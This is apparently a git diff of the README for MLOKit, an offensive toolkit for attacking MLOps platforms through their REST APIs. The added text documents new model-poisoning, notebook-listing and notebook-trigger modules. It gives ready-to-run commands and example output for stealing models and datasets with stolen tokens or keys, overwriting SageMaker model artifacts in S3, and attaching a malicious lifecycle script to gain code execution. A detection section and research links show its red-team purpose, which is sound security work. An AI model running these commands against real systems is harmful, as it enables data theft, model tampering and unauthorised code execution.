@@ -2,13 +2,11 @@
 
 ## Description
 
-MLOps Attack Toolkit - MLOKit is a toolkit that can be used to attack MLOps platforms by taking advantage of the available REST API. This tool allows the user to specify an attack module, along with specifying valid credentials (API key or stolen access token) for the respective MLOps platform. The attack modules supported include reconnaissance, data extraction and model extraction. MLOKit was built in a modular approach, so that new modules can be added in the future by the information security community.
-
-Full details on the techniques used by MLOKit are in the X-Force Red [whitepaper](https://www.ibm.com/downloads/documents/us-en/11630e2cbc302316).
+MLOps Attack Toolkit - MLOKit is a toolkit that can be used to attack MLOps platforms by taking advantage of the available REST API. This tool allows the user to specify an attack module, along with specifying valid credentials for the respective MLOps platform. The attack modules supported include reconnaissance, training data theft, model theft, model poisoning, and notebook attacks. MLOKit was built in a modular approach, so that new modules can be added in the future by the information security community.
 
 
 ## Release
-* Version 1.0 of MLOKit can be found in Releases
+* Version 1.1 of MLOKit can be found in Releases
 
 ## Table of Contents
 
@@ -29,6 +27,9 @@ Full details on the techniques used by MLOKit are in the X-Force Red [whitepaper
   - [List Datasets](#List-Datasets)
   - [Download Model](#download-model)
   - [Download Dataset](#download-dataset)
+  - [Poison Model](#poison-model)
+  - [List Notebooks](#list-notebooks)
+  - [Add Notebook Trigger](#add-notebook-trigger)
 - [Detection](#detection)
 - [References](#references)
 
@@ -41,6 +42,9 @@ The below 3rd party libraries are used in this project.
 | ------------- | ------------- | ------------- |
 | Fody  | [https://github.com/Fody/Fody](https://github.com/Fody/Fody) | MIT License  |
 | Newtonsoft.Json  | [https://github.com/JamesNK/Newtonsoft.Json](https://github.com/JamesNK/Newtonsoft.Json) | MIT License  |
+| AWSSDK.S3  | [https://www.nuget.org/packages/AWSSDK.S3](https://www.nuget.org/packages/AWSSDK.S3)| Apache 2.0 License  |
+| AWSSDK.SageMaker  | [https://www.nuget.org/packages/AWSSDK.SageMaker](https://www.nuget.org/packages/AWSSDK.SageMaker)| Apache 2.0 License  |
+| AWSSDK.Core  | [https://www.nuget.org/packages/awssdk.core/](https://www.nuget.org/packages/awssdk.core/)| Apache 2.0 License  |
 
 ### Pre-Compiled 
 
@@ -57,6 +61,9 @@ Take the below steps to setup Visual Studio in order to compile the project your
   * `Install-Package Costura.Fody -Version 3.3.3`
 * Install the Newtonsoft.Json package
   * `Install-Package Newtonsoft.Json`
+* Install required AWS SDK packages
+  * `Install-Package AWSSDK.S3 -Version 3.7.412.4`
+  * `Install-Package AWSSDK.SageMaker -Version 3.7.421.3`
 * You can now build the project yourself!
 
 ## Command Modules
@@ -67,6 +74,9 @@ Take the below steps to setup Visual Studio in order to compile the project your
 * **list-datasets** - List the available training datasets
 * **download-model** - Download a given ML model
 * **download-dataset** - Download a given training dataset
+* **poison-model** - Poison a given ML model
+* **list-notebooks** - List the available notebook instances
+* **add-notebook-trigger** - Add a notebook trigger for code execution
 
 
 
@@ -76,21 +86,31 @@ Take the below steps to setup Visual Studio in order to compile the project your
 
 The below arguments are required for all command modules.
 
-* **/credential:** - Credential for authentication (API key or Stolen Access Token). Applicable to all modules
+* **/credential:** - Credential for authentication. Applicable to all modules
+  * API Key - `abcdefg123123`
+  * Access Token - `eyJ...`
+  * Access Key & Secret Key - `ABCABC;123456789`
+  * Username/Password - `user;Password!`
 * **/platform:** - MLOps Platform. Applicable to all modules. Supported MLOps platforms listed below.
-  * `azureml`
-  * `bigml`
-  * `vertexai`
+  * Azure ML - `azureml`
+  * BigML - `bigml`
+  * Google Cloud Vertex AI - `vertexai`
+  * MLFlow - `mlflow`
+  * Amazon SageMaker - `sagemaker`
 
 ### Optional Arguments/Dependent on Platform and Module
 
 * **/subscription-id:** - Applicable to `azureml` platform only. Only applies to some command modules.
 * **/resource-group:** - Applicable to `azureml` platform only. Only applies to some command modules.
 * **/workspace:** - Applicable to `azureml` platform only. Only applies to some command modules.
-* **/region:** - Applicable to `azureml` platform only. Only applies to some command modules.
+* **/region:** - Applicable to `azureml` and `sagemaker` platforms only. Only applies to some command modules.
 * **/project:** - Applicable to `vertexai` platform only. Only applies to some command modules.
 * **/model-id:** - Applicable to all platforms. Only applies to some command modules.
 * **/dataset-id:** - Applicable to all platforms. Only applies to some command modules.
+* **/url:** - Applicable to `mlflow` platform only. Only applies to some command modules.
+* **/source-dir:** - Applicable to `azureml` and `sagemaker` platforms only. Only applies to one command module.
+* **/notebook-name:** - Applicable to `sagemaker` platform only. Only applies to some command modules.
+* **/script:** - Applicable to `sagemaker` platform only. Only applies to one command module.
 
 
 
@@ -169,19 +189,27 @@ You can obtain all required information from this file, such as the client ID, c
 
 API key is alphanumeric and is provided as a GET variable name of `api_key=`.
 
+### Access Key and Secret Access Key
+
+####  SageMaker
+
+This only applies to SageMaker. Within the `/credential:` argument provide your `ACCESS_KEY` and `SECRET_ACCESS_KEY` separate by a `;`. For example `/credential:ABC123;AAAFDSKAFLKASDFJSAF`.
+
 ## Module Details Table
 
 The below table shows where each module is supported
 
-Module  | Azure ML (`azureml`) | BigML (`bigml`) | Vertex AI (`vertexai`)
-:---: |:---: | :---: | :---: 
-`check` | X | X | X
-`list-projects` | X | X | X
-`list-models` | X | X | X
-`list-datasets` | X | X | X
-`download-model` | X | X | X
-`download-dataset` | X | X | X
-
+Module  | Azure ML (`azureml`) | BigML (`bigml`) | Vertex AI (`vertexai`) | MLFlow (`mlflow`) | Sagemaker (`sagemaker`)
+:---: |:---: | :---: | :---:  | :---:  | :---:
+`check` | X | X | X | X | X
+`list-projects` | X | X | X | | 
+`list-models` | X | X | X | X | X
+`list-datasets` | X | X | X | | 
+`download-model` | X | X | X | X | X
+`download-dataset` | X | X | X | | 
+`poison-model` | X |  |  | | X
+`list-notebooks` |  |  |  | | X
+`add-notebook-trigger` |  |  |  | | X
 
 
 ## Examples
@@ -208,6 +236,16 @@ Supply the `check` module, along with the MLOps platform in the `/platform:` com
 
 `MLOKit.exe check /platform:vertexai /credential:ya29..`
 
+##### MLFlow
+
+For the `mlflow` platform, you will also have to provide a URL in the `/url:` command argument.
+
+`MLOKit.exe check /platform:mlflow /credential:username;password /url:http://MLFLOW_URL`
+
+##### SageMaker
+
+`MLOKit.exe check /platform:sagemaker /credential:access_key;secret_key /region:[REGION_NAME]`
+
 ##### Example Output
 
 ```
@@ -215,7 +253,6 @@ C:\>MLOKit.exe check /platform:azureml /credential:eyJ0...
 
 ==================================================
 Module:         check
-Credential:     eyJ0e..
 Platform:       azureml
 Timestamp:      4/7/2024 2:09:59 PM
 ==================================================
@@ -271,7 +308,6 @@ C:\>MLOKit.exe list-projects /platform:vertexai /credential:ya29...
 
 ==================================================
 Module:         list-projects
-Credential:     ya29.a...
 Platform:       vertexai
 Timestamp:      4/7/2024 2:14:55 PM
 ==================================================
@@ -317,6 +353,16 @@ For the `vertexai` platform, you will also have to provide a project in the `/pr
 
 `MLOKit.exe list-models /platform:vertexai /credential:ya29.. /project:[PROJECT_NAME]`
 
+##### MLFlow
+
+For the `mlflow` platform, you will also have to provide a URL in the `/url:` command argument.
+
+`MLOKit.exe list-models /platform:mlflow /credential:username;password /url:http://MLFLOW_URL`
+
+##### SageMaker
+
+`MLOKit.exe list-models /platform:sagemaker /credential:access_key;secret_key /region:[REGION_NAME]`
+
 ##### Example Output
 
 ```
@@ -324,7 +370,6 @@ C:\>MLOKit.exe list-models /platform:bigml /credential:username;apiKey
 
 ==================================================
 Module:         list-models
-Credential:     user;apiKey
 Platform:       bigml
 Timestamp:      4/7/2024 2:21:54 PM
 ==================================================
@@ -376,7 +421,6 @@ C:\>MLOKit.exe list-datasets /platform:vertexai /credential:ya29... /project:cor
 
 ==================================================
 Module:         list-datasets
-Credential:     ya29...
 Platform:       vertexai
 Timestamp:      4/7/2024 2:17:11 PM
 ==================================================
@@ -435,6 +479,16 @@ For the `vertexai` platform, you will also have to provide a project in the `/pr
 
 `MLOKit.exe download-model /platform:vertexai /credential:ya29.. /project:[PROJECT_NAME] /model-id:[MODEL_ID]`
 
+##### MLFlow
+
+For the `mlflow` platform, you will also have to provide a url in the `/url:` command argument.
+
+`MLOKit.exe download-model /platform:mlflow /credential:admin;password /url:http://[MLFLOW_URL] /model-id:[MODEL_ID]`
+
+##### SageMaker
+
+`MLOKit.exe download-model /platform:sagemaker /credential:access_key;secret_key /region:[REGION_NAME] /model-id:[MODEL_ID]`
+
 ##### Example Output
 
 ```
@@ -442,7 +496,6 @@ C:\>MLOKit.exe download-model /platform:bigml /credential:username;apiKey /model
 
 ==================================================
 Module:         download-model
-Credential:     username;apiKey
 Platform:       bigml
 Timestamp:      4/7/2024 2:23:02 PM
 ==================================================
@@ -498,7 +551,6 @@ C:\>MLOKit.exe download-dataset /platform:vertexai /credential:ya29... /project:
 
 ==================================================
 Module:         download-dataset
-Credential:     ya29...
 Platform:       vertexai
 Timestamp:      4/7/2024 2:19:23 PM
 ==================================================
@@ -519,6 +571,175 @@ Timestamp:      4/7/2024 2:19:23 PM
 
 ```
 
+### Poison Model
+
+#### Use Case
+
+> *Poison a given ML model by overwriting its model artifacts*
+
+#### Syntax
+
+Supply the `poison-model` module, along with the MLOps platform in the `/platform:` command argument. Additionally, provide a credential in the `/credential:` command argument and a model ID in the `/model-id:` command argument. Finally, supply the `/source-dir:` argument with the directory on your attacker machine that contains the poisoned model files.
+
+##### Azure ML
+
+For the `azureml` platform, you will also have to provide a subscription ID in the `/subscription-id:` command argument. Additionally, you will need to provide a region, resource group and workspace in the `/region:`, `/resource-group:` and `/workspace:` command arguments respectively.
+
+`MLOKit.exe poison-model /platform:azureml /credential:eyJ... /subscription-id:[someSubscriptionID] /region:[REGION] /resource-group:[RESOURCE_GROUP] /workspace:[WORKSPACE_NAME] /model-id:[MODEL_ID] /source-dir:[LOCAL_PATH_TO_FILES]`
+
+##### SageMaker
+
+`MLOKit.exe poison-model /platform:sagemaker /credential:access_key;secret_key /region:[REGION_NAME] /model-id:[MODEL_ID] /source-dir:[LOCAL_PATH_TO_FILES]`
+
+##### Example Output
+
+```
+
+C:\>MLOKit.exe poison-model /platform:sagemaker /credential:access_key;secret_key /region:us-east-2 /model-id:employee-salary-model /source-dir:C:\Demo\MLOKit-OiEJQGbz
+
+==================================================
+Module:         poison-model
+Platform:       sagemaker
+Timestamp:      1/25/2025 9:39:00 PM
+==================================================
+
+
+[*] INFO: Performing poison-model module for sagemaker
+
+[*] INFO: Checking credentials provided
+
+[+] SUCCESS: Credentials are valid
+
+                                        Model Name |        Creation Date |                                          Model ARN
+------------------------------------------------------------------------------------------------------------------------------
+                             employee-salary-model |            1/22/2025 | arn:aws:sagemaker:[REGION]:[ACCOUNT_ID]:model/employee-salary-model
+
+[*] INFO: Model artifacts location
+
+s3://[BUCKET_NAME]/Canvas/default-20250121T171825/Training/output/Canvas1737498359380/sagemaker-automl-candidates/model/Canvas1737498359380-trial-t1-1/model.tar.gz
+
+[*] INFO: Checking access to S3 bucket with name: [BUCKET_NAME]
+
+[+] SUCCESS: You have access to S3 bucket with name: [BUCKET_NAME]
+
+[*] INFO: Listing prefix where files will be uploaded: Canvas/default-20250121T171825/Training/output/Canvas1737498359380/sagemaker-automl-candidates/model/Canvas1737498359380-trial-t1-1/
+
+[*] INFO: Listing files in source directory that will be uploaded
+
+model.tar.gz
+
+[+] SUCCESS: model.tar.gz written to:
+[BUCKET_NAME]/Canvas/default-20250121T171825/Training/output/Canvas1737498359380/sagemaker-automl-candidates/model/Canvas1737498359380-trial-t1-1/model.tar.gz
+
+```
+
+### List Notebooks
+
+#### Use Case
+
+> *List available notebook instances*
+
+#### Syntax
+
+Supply the `list-notebooks` modules, along with the MLOps platform in the `/platform:` command argument.  Additionally, provide a credential in the `/credential:` command argument.
+
+##### SageMaker
+
+`MLOKit.exe list-notebooks /platform:sagemaker /credential:[ACCESS_KEY;SECRET_KEY] /region:[REGION_NAME]`
+
+##### Example Output
+
+```
+
+C:\>MLOKit.exe list-notebooks /platform:sagemaker /credential:access_key;secret_key /region:us-east-2
+
+==================================================
+Module:         list-notebooks
+Platform:       sagemaker
+Timestamp:      1/28/2025 12:59:20 PM
+==================================================
+
+
+[*] INFO: Performing list-notebooks module for sagemaker
+
+[*] INFO: Checking credentials provided
+
+[+] SUCCESS: Credentials are valid
+
+                                     Notebook Name |        Creation Date |      Notebook Status |      Notebook Lifecycle Config
+---------------------------------------------------------------------------------------------------------------------------------
+                               brett-test-notebook |            1/28/2025 |            InService |                
+
+```
+
+### Add Notebook Trigger
+
+#### Use Case
+
+> *Add a trigger for a given notebook to gain code execution*
+
+#### Syntax
+
+Supply the `add-notebook-trigger ` modules, along with the MLOps platform in the `/platform:` command argument.  Additionally, provide a credential in the `/credential:` command argument and a notebook to target in the `/notebook-name:` argument. Finally, add a path to a script file you would like to execution within the notebook environment cloud compute via the `/script:` command argument.
+
+
+##### SageMaker
+
+`MLOKit.exe add-notebook-trigger /platform:sagemaker /credential:[ACCESS_KEY;SECRET_KEY] /region:[REGION_NAME] /notebook-name:[NOTEBOOK_NAME] /script:[PATH_TO_SCRIPT]`
+
+##### Example Output
+
+```
+
+C:\>MLOKit.exe add-notebook-trigger /platform:sagemaker /credential:access_key;secret_key /region:us-east-2 /notebook-name:brett-test-notebook /script:C:\Demo\test.sh
+
+==================================================
+Module:         add-notebook-trigger
+Platform:       sagemaker
+Timestamp:      1/28/2025 12:50:20 PM
+==================================================
+
+
+[*] INFO: Performing add-notebook-trigger module for sagemaker
+
+[*] INFO: Checking credentials provided
+
+[*] INFO: Creating notebook instance lifecycle config
+
+[+] SUCCESS: Notebook instance lifecycle config created with name: MLOKit-TdXhtHNc
+
+[*] INFO: Stopping target notebook instance with name: brett-test-notebook
+
+                                     Notebook Name |        Creation Date |      Notebook Status |      Notebook Lifecycle Config
+---------------------------------------------------------------------------------------------------------------------------------
+                               brett-test-notebook |            1/28/2025 |             Stopping |
+
+[*] INFO: Sleeping for 2 minutes to allow time for notebook to stop
+
+[+] SUCCESS: Notebook instance with name of brett-test-notebook has been stopped successfully.
+
+[*] INFO: Updated notebook named brett-test-notebookwith lifecycle config with name MLOKit-TdXhtHNc
+
+                                     Notebook Name |        Creation Date |      Notebook Status |      Notebook Lifecycle Config
+---------------------------------------------------------------------------------------------------------------------------------
+                               brett-test-notebook |            1/28/2025 |             Updating |
+
+[*] INFO: Sleeping for 2 minutes to allow time for notebook instance lifecycle config to be assigned
+
+[+] SUCCESS: Malicious notebook instance lifecycle config assigned to notebook with name: brett-test-notebook
+
+[*] INFO: Starting target notebook instance with name: brett-test-notebook
+
+                                     Notebook Name |        Creation Date |      Notebook Status |      Notebook Lifecycle Config
+---------------------------------------------------------------------------------------------------------------------------------
+                               brett-test-notebook |            1/28/2025 |              Pending |                MLOKit-TdXhtHNc
+
+[*] INFO: Sleeping for 2 minutes to allow time for notebook to start
+
+[+] SUCCESS: Successfully started notebook with name: brett-test-notebook
+
+```
+
 
 ## Detection
 
@@ -529,10 +750,39 @@ Below are static signatures for the specific usage of this tool in its default s
 * User Agent String - `MLOKit-e977ac02118a3cb2c584d92a324e41e9`
   * See [MLOKit Snort Rule](Detections/MLOKit.rules) in this repo.
 
-For detection guidance of the techniques used by the tool, see the X-Force Red [whitepaper](https://www.ibm.com/downloads/documents/us-en/11630e2cbc302316).
+For detection guidance of the techniques used by the tool, see the below resources
+* [X-Force Red whitepaper](https://www.ibm.com/downloads/documents/us-en/11630e2cbc302316)
+* [X-Force Red blog post](https://www.ibm.com/think/x-force/becoming-the-trainer-attacking-ml-training-infrastructure)
+* KQL Queries - https://github.com/h4wkst3r/KQL-Queries
+* CloudTrail Queries - https://github.com/h4wkst3r/CloudTrail-Queries
 
 
 ## References
+
+### X-Force Red Research
+* https://www.ibm.com/downloads/documents/us-en/11630e2cbc302316
+* https://www.ibm.com/think/x-force/becoming-the-trainer-attacking-ml-training-infrastructure
+
+### Azure ML REST API
 * https://learn.microsoft.com/en-us/rest/api/azureml/?view=rest-azureml-2023-10-01
+
+### Azure Blob Storage REST API
+* https://learn.microsoft.com/en-us/rest/api/storageservices/blob-service-rest-api
+
+### BigML REST API
 * https://bigml.com/api/
+
+### MLFlow REST API
+* https://mlflow.org/docs/latest/rest-api.html
+
+### Vertex AI REST API
 * https://cloud.google.com/vertex-ai/docs/reference/rest
+
+### Google Cloud Storage REST API
+* https://cloud.google.com/storage/docs/apis
+
+### Amazon SageMaker REST API
+* https://docs.aws.amazon.com/sagemaker/latest/dg/api-and-sdk-reference.html
+
+### Amazon S3 REST API
+* https://docs.aws.amazon.com/AmazonS3/latest/API/Type_API_Reference.html
